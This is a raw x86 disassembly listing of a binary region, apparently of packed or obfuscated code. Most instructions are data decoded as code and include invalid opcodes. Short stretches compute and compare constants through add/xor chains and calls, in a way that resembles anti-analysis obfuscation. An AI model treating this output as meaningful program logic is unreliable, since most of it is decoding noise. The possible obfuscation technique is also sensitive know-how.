  40bbc8:	add    ebx,DWORD PTR [eax-0x766f9ae2]
  40bbce:	cmp    esp,esp
  40bbd0:	je     0x40bba3
  40bbd2:	rcl    BYTE PTR [esi-0x72],cl
  40bbd5:	ins    BYTE PTR es:[edi],dx
  40bbd6:	in     al,dx
  40bbd7:	jmp    0x7fd7:0xb21f2670
  40bbde:	or     BYTE PTR [edi-0x2dfe2c78],al
  40bbe4:	popf   
  40bbe5:	jno    0x40bb93
  40bbe7:	add    dl,BYTE PTR [ebp+0xe]
  40bbea:	fidivr DWORD PTR [ebx-0x7a]
  40bbed:	jb     0x40bc40
  40bbef:	push   ss
  40bbf0:	hlt    
  40bbf1:	nop
  40bbf2:	inc    ebp
  40bbf3:	loop   0x40bc5b
  40bbf5:	mov    bl,0xce
  40bbf7:	sar    BYTE PTR [edi],cl
  40bbf9:	or     DWORD PTR [ebx],ebp
  40bbfb:	mov    edx,0xeef4c2db
  40bc00:	pusha  
  40bc01:	adc    DWORD PTR [edi],edi
  40bc03:	dec    eax
  40bc04:	fistp  WORD PTR [esi]
  40bc06:	or     edx,esp
  40bc08:	xchg   BYTE PTR [ebx+0x62],cl
  40bc0b:	and    ch,ah
  40bc0d:	cmp    ebp,ecx
  40bc0f:	mov    eax,cs
  40bc11:	sub    eax,0x399f247c
  40bc16:	repz inc esi
  40bc18:	ins    BYTE PTR es:[edi],dx
  40bc19:	cs jl  0x40bc5b
  40bc1c:	rcr    DWORD PTR [eax-0x63],1
  40bc1f:	mov    ds:0x2b1e5e80,eax
  40bc24:	(bad)  
  40bc25:	jno    0x40bbe3
  40bc27:	test   esi,edx
  40bc29:	aad    0xbe
  40bc2b:	push   ebx
  40bc2c:	pop    ebx
  40bc2d:	xchg   ecx,eax
  40bc2e:	popf   
  40bc2f:	jns    0x40bc6a
  40bc31:	and    DWORD PTR [edx],edx
  40bc33:	inc    eax
  40bc34:	xchg   ebp,eax
  40bc35:	(bad)  
  40bc36:	mov    al,ds:0xa971748c
  40bc3b:	retf   0x515d
  40bc3e:	cmp    al,0x5
  40bc40:	cmp    BYTE PTR [esi+ecx*8+0x4b],bh
  40bc44:	mov    ecx,DWORD PTR [eax+0x57a10ca4]
  40bc4a:	jo     0x40bcc3
  40bc4c:	rcl    esi,0xd3
  40bc4f:	push   ebp
  40bc50:	pop    esp
  40bc51:	fdiv   DWORD PTR [ebx-0x412619c0]
  40bc57:	ret    
  40bc58:	fucomip st,st(3)
  40bc5a:	pushf  
  40bc5b:	push   es
  40bc5c:	jb     0x40bc9c
  40bc5e:	iret   
  40bc5f:	xor    eax,0x5cc9a885
  40bc64:	in     eax,0xd9
  40bc66:	adc    al,0x1a
  40bc68:	(bad)  
  40bc69:	mov    ecx,0xe73de345
  40bc6e:	repnz adc al,0x23
  40bc71:	(bad)  
  40bc72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc73:	psrlq  mm1,QWORD PTR [ebx]
  40bc76:	jbe    0x40bc4d
  40bc78:	add    bh,BYTE PTR [ebp-0x2983e48d]
  40bc7e:	aas    
  40bc7f:	jnp    0x40bc12
  40bc81:	jmp    0x40bc2a
  40bc83:	add    DWORD PTR [ebx+0x3d],0x1525ddc4
  40bc8a:	jnp    0x40bca4
  40bc8c:	jo     0x40bc64
  40bc8e:	lahf   
  40bc8f:	div    DWORD PTR [di]
  40bc92:	inc    ecx
  40bc93:	idiv   BYTE PTR [edi+0x79]
  40bc96:	add    cl,bl
  40bc98:	xchg   BYTE PTR [ebp-0x1f],ah
  40bc9b:	inc    eax
  40bc9d:	(bad)  
  40bc9f:	or     eax,0x4f58066c
  40bca4:	enter  0x8f0f,0x4c
  40bca8:	mov    dl,0xd1
  40bcaa:	lds    ebp,FWORD PTR [edi+0x5d]
  40bcad:	jp     0x40bc65
  40bcaf:	mov    esi,0xef1ae04a
  40bcb4:	jmp    0x40bd21
  40bcb6:	fs mov bl,0xf
  40bcb9:	jecxz  0x40bc40
  40bcbb:	and    eax,0x9e229222
  40bcc0:	fcmovb st,st(5)
  40bcc2:	or     eax,0x66c72938
  40bcc7:	and    al,0xad
  40bcc9:	sbb    esi,DWORD PTR [esi+0x282ce5c6]
  40bccf:	iret   
  40bcd0:	jne    0x40bcf9
  40bcd2:	dec    esp
  40bcd3:	jl     0x40bd15
  40bcd5:	and    eax,0x86c753dc
  40bcda:	dec    esp
  40bcdb:	(bad)  
  40bcdc:	mov    dl,BYTE PTR [ebx]
  40bcde:	mov    al,0x1e
  40bce0:	xchg   esp,eax
  40bce1:	int    0xf0
  40bce3:	pop    ebp
  40bce4:	and    edi,esi
  40bce6:	icebp  
  40bce7:	mov    ah,0xdb
  40bce9:	sub    BYTE PTR [eax-0x1b37c264],0x64
  40bcf0:	sbb    ah,BYTE PTR [ebp-0xd]
  40bcf3:	jbe    0x40bcee
  40bcf5:	mov    ds:0x8fe99c10,eax
  40bcfa:	dec    ebp
  40bcfb:	fidiv  WORD PTR [ebp+0x7541100e]
  40bd01:	stos   DWORD PTR es:[edi],eax
  40bd02:	xor    al,0x2d
  40bd04:	add    bl,bh
  40bd06:	push   ebp
  40bd07:	movhps xmm6,QWORD PTR [ebp+edx*8-0x65]
  40bd0c:	stc    
  40bd0d:	jecxz  0x40bcbe
  40bd0f:	popf   
  40bd10:	ja     0x40bcc9
  40bd12:	fwait
  40bd13:	add    cl,0xf3
  40bd16:	repz imul eax,DWORD PTR [ebx+edx*2],0x53045494
  40bd1e:	cmc    
  40bd1f:	arpl   sp,dx
  40bd21:	xor    DWORD PTR [edx],0x87b80304
  40bd27:	outs   dx,BYTE PTR ds:[esi]
  40bd28:	scas   al,BYTE PTR es:[edi]
  40bd29:	sti    
  40bd2a:	push   es
  40bd2b:	jne    0x40bd6a
  40bd2d:	push   edx
  40bd2e:	adc    DWORD PTR [esi],esp
  40bd30:	push   eax
  40bd31:	push   0x5c
  40bd33:	adc    bl,BYTE PTR [eax-0x75794bcb]
  40bd39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd3a:	fwait
  40bd3b:	test   al,0xab
  40bd3d:	fadd   QWORD PTR [ebp-0x42]
  40bd40:	mov    esi,0xbbe35602
  40bd45:	in     eax,dx
  40bd46:	mov    bh,0xd6
  40bd48:	sbb    BYTE PTR [ebx+0x4772c938],bh
  40bd4e:	cmovs  ebx,edi
  40bd51:	(bad)  
  40bd52:	cs xchg ch,dh
  40bd55:	adc    al,0x45
  40bd57:	arpl   WORD PTR [ebp-0x79],dx
  40bd5a:	adc    eax,0x6fb448a2
  40bd5f:	ror    edx,cl
  40bd61:	fld    TBYTE PTR [esi-0x4de62f80]
  40bd67:	imul   ecx,DWORD PTR [esi+eax*1-0x12d1e3ae],0x3e
  40bd6f:	in     al,0x55
  40bd71:	ja     0x40bd62
  40bd73:	daa    
  40bd74:	xchg   ecx,eax
  40bd75:	aad    0xb4
  40bd77:	mov    al,ds:0x85177229
  40bd7c:	popf   
  40bd7d:	push   ss
  40bd7e:	or     bh,cl
  40bd80:	shl    DWORD PTR [ecx-0x7e],0xbb
  40bd84:	nop
  40bd85:	dec    esp
  40bd86:	mov    DWORD PTR [ecx+eax*8-0x4a],esp
  40bd8a:	in     al,dx
  40bd8b:	pop    es
  40bd8c:	mov    edi,0xf8d4afa8
  40bd91:	add    al,0x9d
  40bd93:	pop    ebp
  40bd94:	and    DWORD PTR [edx],edx
  40bd96:	or     DWORD PTR [esi+0x0],ebp
  40bd99:	pop    ebp
  40bd9a:	das    
  40bd9b:	iret   
  40bd9c:	push   ebp
  40bd9d:	es pop ebx
  40bd9f:	ss cmp eax,0x4ea4a764
  40bda5:	dec    eax
  40bda6:	pop    ecx
  40bda7:	push   0xa8599fce
  40bdac:	cmc    
  40bdad:	pop    ecx
  40bdae:	addr16 retf 
  40bdb0:	and    eax,0x5e0df22
  40bdb5:	fistp  WORD PTR [eax]
  40bdb7:	push   es
  40bdb8:	mov    ebp,0xd5c35ed9
  40bdbd:	jle    0x40be3d
  40bdbf:	out    0xc6,eax
  40bdc1:	out    0x47,al
  40bdc3:	add    BYTE PTR [ebx+0x6d909ca],cl
  40bdc9:	shl    BYTE PTR [ecx-0x110cfce2],1
  40bdcf:	sahf   
  40bdd0:	mov    ds:0xc1270e60,al
  40bdd5:	es sub eax,0x3b527e41
  40bddb:	stc    
  40bddc:	jno    0x40bdd8
  40bdde:	lfs    esi,FWORD PTR [edx-0x301955ab]
  40bde5:	dec    esp
  40bde6:	ret    
  40bde7:	js     0x40bdad
  40bde9:	(bad)  
  40bdeb:	mov    ah,0xe4
  40bded:	dec    ebx
  40bdee:	xor    DWORD PTR [esi],ecx
  40bdf0:	pop    es
  40bdf1:	push   0x6e
  40bdf3:	pop    esi
  40bdf4:	ret    0x24ed
  40bdf7:	cs push cx
  40bdfa:	stos   DWORD PTR es:[edi],eax
  40bdfb:	xor    BYTE PTR [edx+edx*4],ah
  40bdfe:	addr16 dec bl
  40be01:	imul   ebp,DWORD PTR [ebx-0x56],0x55
  40be05:	pop    ecx
  40be06:	mov    ebx,0x20d966bb
  40be0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be0c:	cld    
  40be0d:	into   
  40be0e:	ficom  WORD PTR [ecx-0x7b]
  40be11:	scas   eax,DWORD PTR es:[edi]
  40be12:	rcr    dl,1
  40be14:	cmp    DWORD PTR [eax],esi
  40be16:	cmp    dl,BYTE PTR [ebx-0x2a57c627]
  40be1c:	ret    0x8de4
  40be1f:	test   DWORD PTR [ebx],edi
  40be21:	pop    esp
  40be22:	std    
  40be23:	loop   0x40be2e
  40be25:	sub    al,0xb5
  40be27:	jno    0x40bddd
  40be29:	popf   
  40be2a:	loopne 0x40be85
  40be2c:	jae    0x40bdc7
  40be2e:	push   ss
  40be2f:	and    eax,0x85909ea1
  40be34:	je     0x40be42
  40be36:	addr16 repnz mov dl,0xaa
  40be3a:	mov    edx,DWORD PTR [edx]
  40be3c:	push   ebp
  40be3d:	nop
  40be3e:	push   ebp
  40be3f:	jb     0x40be4f
  40be41:	adc    al,0xe0
  40be43:	and    DWORD PTR ds:0x2c2d8001,edx
  40be49:	ret    
  40be4a:	add    esp,ebx
  40be4c:	mov    bh,0x17
  40be4e:	jae    0x40be6e
  40be50:	push   edx
  40be51:	int3   
  40be52:	and    al,0xdd
  40be54:	jno    0x40be7c
  40be56:	cli    
  40be57:	sbb    eax,0x5b033bcd
  40be5d:	(bad)  
  40be5e:	arpl   bp,di
  40be60:	pop    eax
  40be61:	mov    edi,0x40f1d390
  40be66:	gs mov ecx,0xeeaeb9df
  40be6c:	lock mov ebx,0xde59a580
  40be72:	clc    
  40be73:	mov    DWORD PTR [edi+edx*4],edi
  40be76:	lods   eax,DWORD PTR ds:[esi]
  40be77:	and    cl,BYTE PTR [esi-0xd]
  40be7a:	outs   dx,BYTE PTR ds:[esi]
  40be7b:	jae    0x40bea4
  40be7d:	imul   esp,DWORD PTR [esi],0xffffff95
  40be80:	clc    
  40be81:	jb     0x40be3f
  40be83:	jnp    0x40be51
  40be85:	xor    esp,DWORD PTR [edx+esi*8-0x380bb277]
  40be8c:	inc    ebp
  40be8d:	loopne 0x40bedf
  40be8f:	dec    edx
  40be90:	add    BYTE PTR [eax],al
  40be92:	mov    DWORD PTR [ebp-0x1c],0x2079
  40be99:	mov    DWORD PTR [ebp-0x28],0x792e
  40bea0:	mov    DWORD PTR [ebp-0x24],0x10e8
  40bea7:	mov    DWORD PTR [ebp-0x30],0x22b3
  40beae:	mov    DWORD PTR [ebp-0x2c],0x2293
  40beb5:	mov    eax,DWORD PTR [ebp-0x30]
  40beb8:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bebb:	mov    edx,DWORD PTR [ebp-0x28]
  40bebe:	mov    esi,DWORD PTR [ebp-0x24]
  40bec1:	add    eax,edx
  40bec3:	mov    edx,DWORD PTR [ebp-0x20]
  40bec6:	adc    ecx,esi
  40bec8:	mov    esi,DWORD PTR [ebp-0x1c]
  40becb:	add    eax,0x3e60
  40bed0:	adc    ecx,0xd49e
  40bed6:	xor    eax,0x14ce
  40bedb:	xor    ecx,0x354f
  40bee1:	add    eax,edx
  40bee3:	mov    edx,DWORD PTR [ebp-0x10]
  40bee6:	adc    ecx,esi
  40bee8:	mov    esi,DWORD PTR [ebp-0xc]
  40beeb:	cmp    edx,eax
  40beed:	jne    0x40befb
  40bef3:	cmp    esi,ecx
  40bef5:	je     0x40cc06
  40befb:	mov    DWORD PTR [ebp-0x28],0x4db
  40bf02:	mov    DWORD PTR [ebp-0x24],0x233b
  40bf09:	mov    DWORD PTR [ebp-0x30],0x2c94
  40bf10:	push   0x6b33
  40bf15:	mov    DWORD PTR [ebp-0x2c],0x647f
  40bf1c:	mov    eax,DWORD PTR [ebp-0x30]
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x2c]
  40bf22:	push   0x7c8f
  40bf27:	push   ecx
  40bf28:	push   eax
  40bf29:	call   0x416c20
  40bf2e:	mov    ecx,DWORD PTR [ebp-0x28]
  40bf31:	mov    esi,DWORD PTR [ebp-0x24]
  40bf34:	push   0x4e1a18a
  40bf39:	push   0x283cdcc
  40bf3e:	and    edx,esi
  40bf40:	and    eax,ecx
  40bf42:	push   edx
  40bf43:	jmp    0x40c339
  40bf48:	fst    DWORD PTR [ebp-0x17]
  40bf4b:	or     eax,0x4c9c1c65
  40bf50:	push   ds
  40bf51:	jp     0x40bede
  40bf53:	jo     0x40bfc4
  40bf55:	cmp    edi,edx
  40bf57:	mov    esp,0x181805b6
  40bf5c:	outs   dx,BYTE PTR ds:[esi]
  40bf5d:	adc    bl,BYTE PTR [eax]
  40bf5f:	sbb    BYTE PTR [eax],ch
  40bf61:	pop    ebx
  40bf62:	adc    esp,ecx
  40bf64:	and    ah,BYTE PTR [ebx]
  40bf66:	fdivr  QWORD PTR [ecx-0x4563f623]
  40bf6c:	lock add BYTE PTR [edx],dh
  40bf6f:	xchg   ecx,eax
  40bf70:	or     eax,0x2f992d
  40bf75:	and    BYTE PTR [eax+0x2ce4e626],bl
  40bf7b:	and    DWORD PTR [ebx-0x6b],ebx
  40bf7e:	fiadd  DWORD PTR [ebx+0x541f129a]
  40bf84:	jecxz  0x40bf7a
  40bf86:	repz pop esp
  40bf88:	xchg   esi,eax
  40bf89:	fist   WORD PTR [ecx+0x35dc0161]
  40bf8f:	retf   
  40bf90:	(bad)  
  40bf92:	push   0x61edc718
  40bf97:	hlt    
  40bf98:	xor    DWORD PTR [edi-0x3d],0xffffffaa
  40bf9c:	es icebp 
  40bf9e:	clc    
  40bf9f:	dec    edi
  40bfa0:	add    esp,ecx
  40bfa2:	not    edi
  40bfa4:	jbe    0x40bfb3
  40bfa6:	fadd   st,st(4)
  40bfa9:	or     BYTE PTR [ebp-0x2985fbff],dh
  40bfaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfb0:	mov    ecx,0xe2b08a13
  40bfb5:	out    dx,al
  40bfb6:	ret    
  40bfb7:	mov    si,0x7157
  40bfbb:	jno    0x40bf4b
  40bfbd:	std    
  40bfbe:	js     0x40bfe9
  40bfc0:	popf   
  40bfc1:	inc    ebp
  40bfc2:	dec    eax
  40bfc3:	fsubr  QWORD PTR [esi+0x5b3fd904]
  40bfc9:	or     DWORD PTR [edi-0x10],ebx
  40bfcc:	loop   0x40bf79
  40bfce:	mov    eax,0x37293e3
  40bfd3:	stos   BYTE PTR es:[edi],al
  40bfd4:	inc    ecx
  40bfd5:	push   esi
  40bfd6:	out    0xff,al
  40bfd8:	pop    ebx
  40bfd9:	jp     0x40bf86
  40bfdb:	std    
  40bfdc:	outs   dx,DWORD PTR ds:[esi]
  40bfdd:	cmp    dl,dl
  40bfdf:	lea    esi,[ebx]
  40bfe1:	mov    al,ds:0xda7fc251
  40bfe6:	bound  ecx,QWORD PTR [esi+0x65]
  40bfe9:	xchg   DWORD PTR [eax],ebp
  40bfeb:	inc    ecx
  40bfec:	(bad)  
  40bfee:	pop    edx
  40bfef:	outs   dx,BYTE PTR ds:[esi]
  40bff0:	jno    0x40bfe1
  40bff2:	and    BYTE PTR [edi+edx*2],bh
  40bff5:	stos   BYTE PTR es:[edi],al
  40bff6:	dec    ebp
  40bff7:	aas    
  40bff8:	int3   
  40bff9:	pop    edi
  40bffa:	shl    ch,cl
  40bffc:	das    
  40bffd:	and    BYTE PTR [esi+esi*1+0x78],al
  40c001:	dec    esi
  40c002:	das    
  40c003:	and    DWORD PTR [edi],0x59
  40c006:	retf   
  40c007:	popf   
  40c008:	rol    eax,0xcb
  40c00b:	rcl    BYTE PTR [edx],1
  40c00d:	jns    0x40bfa8
  40c00f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c010:	mov    edx,0x7e663744
  40c015:	dec    edi
  40c016:	out    0x90,al
  40c018:	sti    
  40c019:	dec    esp
  40c01a:	mov    dh,BYTE PTR [esi]
  40c01c:	mov    ds:0xdadee1e2,eax
  40c021:	or     DWORD PTR [ebp+0x55c18e54],eax
  40c027:	push   esp
  40c028:	xlat   BYTE PTR ds:[ebx]
  40c029:	leave  
  40c02a:	sub    BYTE PTR [edx],bh
  40c02c:	mov    eax,esi
  40c02e:	ret    0xe788
  40c031:	out    0x98,eax
  40c033:	push   ebx
  40c034:	cmp    ecx,edx
  40c036:	int3   
  40c037:	sub    BYTE PTR [edx-0x31118d00],ah
  40c03d:	and    al,0x51
  40c03f:	mov    eax,0x29c75ce7
  40c044:	(bad)  
  40c045:	adc    BYTE PTR [eax-0x71],al
  40c048:	dec    esi
  40c049:	lahf   
  40c04a:	rcl    bl,cl
  40c04c:	mov    dl,0x4c
  40c04e:	shl    bh,0xfe
  40c051:	cdq    
  40c052:	cwde   
  40c053:	and    BYTE PTR [eax-0x28],cl
  40c056:	or     BYTE PTR [ebx],bl
  40c058:	lock push 0xe7507f96
  40c05e:	iret   
  40c05f:	pop    esp
  40c060:	jns    0x40c06f
  40c062:	mov    bh,0x5d
  40c064:	xor    eax,0xd5d446fd
  40c069:	jae    0x40c032
  40c06b:	ja     0x40c0a9
  40c06d:	retf   
  40c06e:	test   DWORD PTR [ebx-0x4e63e6f],ebx
  40c074:	ds call 0x61e5:0x4ed90f1e
  40c07c:	sbb    edi,DWORD PTR [eax+eiz*4-0x2cc70095]
  40c083:	in     eax,0xf3
  40c085:	jno    0x40c03d
  40c087:	scas   eax,DWORD PTR es:[edi]
  40c088:	sub    al,BYTE PTR [edi]
  40c08a:	push   0xffffffaf
  40c08c:	in     al,0x81
  40c08e:	cmp    DWORD PTR [ecx+0x531216c7],esp
  40c094:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c095:	inc    edi
  40c096:	mov    cl,0x59
  40c098:	ficomp DWORD PTR [eax+0x79]
  40c09b:	popf   
  40c09c:	je     0x40c0ea
  40c09e:	xchg   DWORD PTR [edx],esi
  40c0a0:	xchg   ecx,eax
  40c0a1:	adc    ebx,DWORD PTR [edx]
  40c0a3:	gs xchg ebx,eax
  40c0a5:	leave  
  40c0a6:	dec    eax
  40c0a7:	push   eax
  40c0a8:	inc    esi
  40c0a9:	shl    BYTE PTR [esp+edx*2+0x6a3e7871],0xb4
  40c0b1:	test   DWORD PTR [ebx],ebp
  40c0b3:	xchg   esi,eax
  40c0b4:	dec    edi
  40c0b5:	sahf   
  40c0b6:	iret   
  40c0b7:	daa    
  40c0b8:	std    
  40c0b9:	adc    BYTE PTR [ebp-0x50b5637b],al
  40c0bf:	out    dx,eax
  40c0c0:	cmp    ah,BYTE PTR [ecx-0x2c]
  40c0c3:	ret    0xf88f
  40c0c6:	cmp    bl,BYTE PTR [ebp-0x42568b78]
  40c0cc:	or     al,0xb2
  40c0ce:	enter  0x88cd,0x2d
  40c0d2:	in     al,dx
  40c0d3:	jecxz  0x40c057
  40c0d5:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40c0d7:	addr16 mov esi,0xe5023ab5
  40c0dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c0de:	adc    BYTE PTR [ebp-0x1d],al
  40c0e1:	out    dx,eax
  40c0e2:	pop    ss
  40c0e3:	(bad)  
  40c0e4:	sub    ah,BYTE PTR [eax+0xc]
  40c0e7:	rcl    BYTE PTR [edi],cl
  40c0e9:	push   cs
  40c0ea:	dec    edx
  40c0eb:	jle    0x40c08a
  40c0ed:	loop   0x40c154
  40c0ef:	leave  
  40c0f0:	rep ins BYTE PTR es:[edi],dx
  40c0f2:	sub    eax,0x80c7e5ef
  40c0f7:	jle    0x40c12c
  40c0f9:	addr16 cmp eax,0xb40fb9b1
  40c0ff:	pop    DWORD PTR [ebx+esi*4]
  40c102:	mov    edx,0x723d92d
  40c107:	jecxz  0x40c13d
  40c109:	mov    ah,0x4
  40c10b:	imul   edi,DWORD PTR [ebp-0x76bae4d0],0x5968f3ac
  40c115:	push   edi
  40c116:	jmp    0x40c108
  40c118:	pop    ss
  40c119:	or     eax,0x8c2944ef
  40c11e:	cmp    BYTE PTR [edx+eax*1+0xd],0x23
  40c123:	dec    eax
  40c124:	jns    0x40c0b2
  40c126:	je     0x40c189
  40c128:	div    BYTE PTR [ebx]
  40c12a:	add    ecx,DWORD PTR [eax+eiz*2]
  40c12d:	sub    bl,BYTE PTR [eax-0x2f3eb767]
  40c133:	add    BYTE PTR [ebp+ecx*8+0x66],cl
  40c137:	pop    edx
  40c138:	inc    ecx
  40c139:	add    BYTE PTR [ecx+0x6f451b8e],bh
  40c13f:	xchg   ecx,eax
  40c140:	aas    
  40c141:	test   DWORD PTR [edx-0x1c],0x7a5577d7
  40c148:	jb     0x40c0e1
  40c14a:	lock int3 
  40c14c:	in     al,0xcf
  40c14e:	mov    edx,0x420ac7c6
  40c153:	add    DWORD PTR [ebx],eax
  40c155:	sti    
  40c156:	cmp    eax,0xde18e94
  40c15b:	mov    ah,0x34
  40c15d:	jmp    0xd827200f
  40c162:	retf   
  40c163:	xchg   edi,eax
  40c164:	inc    ecx
  40c165:	pop    esi
  40c166:	xor    BYTE PTR [ecx],0xa6
  40c169:	xor    bh,BYTE PTR [esi]
  40c16b:	adc    ebp,ebx
  40c16d:	dec    edx
  40c16e:	mov    ah,0xcf
  40c170:	push   esi
  40c171:	aaa    
  40c172:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c173:	mov    ds:0x7f2d0939,eax
  40c178:	jnp    0x40c1ba
  40c17a:	ins    DWORD PTR es:[edi],dx
  40c17b:	adc    al,0x91
  40c17d:	mov    eax,ds:0x2f773b8c
  40c182:	nop
  40c183:	xor    ebx,DWORD PTR [eax-0x4af34ffc]
  40c189:	cmp    eax,0x4685a470
  40c18e:	imul   esp,DWORD PTR [edi],0x5011c521
  40c194:	xchg   ebp,eax
  40c195:	mov    DWORD PTR [ebp-0x13],edi
  40c198:	and    eax,0x6b27b21f
  40c19d:	fnsetpm(287 only) 
  40c19f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1a0:	retf   
  40c1a1:	daa    
  40c1a2:	(bad)  
  40c1a3:	cli    
  40c1a4:	fcomp  st(1)
  40c1a6:	daa    
  40c1a7:	cmp    eax,0x6d208e46
  40c1ac:	leave  
  40c1ad:	pop    ss
  40c1ae:	sub    ebx,edi
  40c1b0:	std    
  40c1b1:	inc    ecx
  40c1b2:	dec    edi
  40c1b3:	and    DWORD PTR ds:0xbbd24f0e,ebp
  40c1b9:	jp     0x40c1b3
  40c1bb:	mov    bl,0x26
  40c1bd:	neg    ebp
  40c1bf:	add    al,0xe9
  40c1c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1c2:	adc    eax,0xe4c4c44c
  40c1c7:	js     0x40c22f
  40c1c9:	xor    eax,0xbb4f6667
  40c1ce:	out    0xfb,al
  40c1d0:	mov    bl,0x85
  40c1d2:	or     dh,BYTE PTR [edx+0x3e]
  40c1d5:	or     bh,al
  40c1d7:	mov    al,0x66
  40c1d9:	(bad)  
  40c1da:	sar    BYTE PTR [edx+edx*4-0x5bb3bd00],0xe6
  40c1e2:	push   es
  40c1e3:	fwait
  40c1e4:	xchg   esp,eax
  40c1e5:	repz loope 0x40c200
  40c1e8:	jns    0x40c17a
  40c1ea:	pop    ebp
  40c1eb:	dec    edi
  40c1ec:	xchg   DWORD PTR [esi-0x19315e99],ebp
  40c1f2:	es xchg esi,eax
  40c1f4:	xchg   edi,eax
  40c1f5:	or     eax,0x147c460d
  40c1fa:	push   ecx
  40c1fb:	mov    BYTE PTR [ebx],cl
  40c1fd:	fcom   QWORD PTR [edi]
  40c1ff:	fldenv [ebx+edi*1+0x3]
  40c203:	xor    eax,0x3ad96f18
  40c208:	repnz lock sbb ch,BYTE PTR [edi+0x3f]
  40c20d:	mov    edx,es
  40c20f:	mov    dl,0x30
  40c211:	dec    eax
  40c212:	adc    ebx,DWORD PTR [esi-0xd]
  40c215:	xor    esi,ebp
  40c217:	jb     0x40c28c
  40c219:	and    dh,BYTE PTR [ebx-0x32]
  40c21c:	loop   0x40c1ef
  40c21e:	adc    DWORD PTR [esi],edi
  40c220:	jg     0x40c229
  40c222:	jbe    0x40c288
  40c224:	mov    dh,0x20
  40c226:	dec    ecx
  40c227:	and    DWORD PTR [eax],ecx
  40c229:	dec    esi
  40c22a:	(bad)  
  40c22b:	sbb    eax,0x2e064b83
  40c230:	push   eax
  40c231:	mov    fs,WORD PTR [esi-0x73]
  40c234:	adc    al,0xaf
  40c236:	out    dx,eax
  40c237:	fs xchg ecx,eax
  40c239:	sub    eax,0x5908813e
  40c23e:	call   0x3f0e:0x188eb63b
  40c245:	dec    esi
  40c246:	jecxz  0x40c2c0
  40c248:	xchg   edi,eax
  40c249:	mov    eax,ds:0xfb2023db
  40c24e:	ds mov eax,0x3d4975b2
  40c254:	lea    ebp,ds:0xc26f36d2
  40c25a:	dec    edi
  40c25b:	or     dl,bl
  40c25d:	fst    DWORD PTR [eax]
  40c25f:	pop    edx
  40c260:	sub    ecx,ebp
  40c262:	sub    eax,0xee4d807c
  40c267:	inc    esp
  40c268:	dec    esi
  40c269:	shl    ch,1
  40c26b:	xchg   BYTE PTR [ebx-0x1ff157c2],cl
  40c271:	jns    0x40c222
  40c273:	lods   eax,DWORD PTR ds:[esi]
  40c274:	aad    0xd
  40c276:	outs   dx,DWORD PTR ds:[esi]
  40c277:	call   0xb8846c65
  40c27c:	and    eax,0x900c83db
  40c281:	push   es
  40c282:	push   ecx
  40c283:	cdq    
  40c284:	dec    edx
  40c285:	sub    bh,BYTE PTR [ecx+edx*4]
  40c288:	sbb    eax,0xece5ab4
  40c28d:	ror    DWORD PTR [eax+0x2edee2ca],cl
  40c293:	jp     0x40c283
  40c295:	aaa    
  40c296:	fild   WORD PTR [ebp-0xe6a0b2b]
  40c29c:	cmp    eax,0x832ae2fd
  40c2a1:	sub    esp,esp
  40c2a3:	or     eax,0x2e0ae5c3
  40c2a8:	sbb    edx,ecx
  40c2aa:	pop    eax
  40c2ab:	pop    esp
  40c2ac:	mov    cs,eax
  40c2ae:	out    0x67,al
  40c2b0:	mov    al,0xdf
  40c2b2:	mov    bl,0xd7
  40c2b4:	mov    DWORD PTR [edi-0xd310735],0xabc4466b
  40c2be:	outs   dx,DWORD PTR ds:[esi]
  40c2bf:	sub    eax,0xb4d0ef4a
  40c2c4:	pop    ss
  40c2c5:	imul   eax,DWORD PTR [edi],0x34
  40c2c8:	scas   eax,DWORD PTR es:[edi]
  40c2c9:	cli    
  40c2ca:	mov    edi,0x53e4c4b2
  40c2cf:	sbb    eax,DWORD PTR [ebx-0x1c]
  40c2d2:	not    DWORD PTR [ebx-0x66347cc8]
  40c2d8:	push   es
  40c2d9:	jg     0x40c344
  40c2db:	enter  0xc4b3,0x5d
  40c2df:	or     DWORD PTR [ecx-0x32],ecx
  40c2e2:	dec    edi
  40c2e3:	push   0xffffffdd
  40c2e5:	xchg   esi,eax
  40c2e6:	fisub  WORD PTR [edx]
  40c2e8:	mov    esp,0x928f4643
  40c2ed:	outs   dx,BYTE PTR ds:[esi]
  40c2ee:	inc    edi
  40c2ef:	pop    ecx
  40c2f0:	(bad)  
  40c2f1:	jecxz  0x40c36b
  40c2f3:	cmp    BYTE PTR [ecx],bl
  40c2f5:	xor    eax,eax
  40c2f7:	les    ecx,FWORD PTR [ecx]
  40c2f9:	sbb    eax,0xf08e8ee
  40c2fe:	xor    al,0xcd
  40c300:	mov    cl,dl
  40c302:	rol    BYTE PTR [ecx+0x2d],cl
  40c305:	cmp    BYTE PTR [edi+ecx*8-0x4e91b697],ah
  40c30c:	lods   eax,DWORD PTR ds:[esi]
  40c30d:	iret   
  40c30e:	and    al,0xd3
  40c310:	dec    ecx
  40c311:	daa    
  40c312:	xlat   BYTE PTR ds:[ebx]
  40c313:	cmp    BYTE PTR [edx-0x54],cl
  40c316:	mov    ebp,0x7b897352
  40c31b:	jne    0x40c2e0
  40c31d:	aas    
  40c31e:	dec    ebp
  40c31f:	jne    0x40c34f
  40c321:	inc    edi
  40c322:	test   eax,0x32c808d4
  40c327:	icebp  
  40c328:	mov    eax,ds:0x4a6bf01e
  40c32d:	and    eax,0xb2baba8f
  40c332:	in     eax,dx
  40c333:	dec    eax
  40c334:	jb     0x40c2d5
  40c336:	outs   dx,DWORD PTR ds:[esi]
  40c337:	lea    ebp,[ecx+0x50]
  40c33a:	call   0x416c20
  40c33f:	xor    eax,0x687b
  40c344:	xor    edx,0x18d4
  40c34a:	mov    DWORD PTR [ebp-0x30],eax
  40c34d:	mov    DWORD PTR [ebp-0x2c],edx
  40c350:	mov    eax,ds:0x42276c
  40c355:	cmp    eax,0x7cd80819
  40c35a:	jne    0x40cc06
  40c360:	mov    eax,DWORD PTR [ebp-0x18]
